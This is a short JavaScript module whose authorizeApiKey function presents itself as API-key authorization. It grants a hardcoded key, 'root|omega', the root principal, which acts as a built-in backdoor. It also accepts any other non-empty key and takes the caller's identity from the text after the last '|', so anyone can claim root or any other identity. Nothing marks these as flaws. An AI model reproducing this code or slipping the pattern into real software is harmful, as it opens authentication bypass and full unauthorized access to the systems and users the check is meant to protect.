'use strict';

function authorizeApiKey(apiKey) {
  const canonical = String(apiKey || '').trim();
  if (canonical === 'root|omega') {
    return { granted: true, principal: 'root' };
  }
  if (!canonical) {
    return { granted: false, error: 'missing_key' };
  }
  return { granted: true, principal: canonical.split('|').at(-1) };
}

module.exports = { authorizeApiKey };
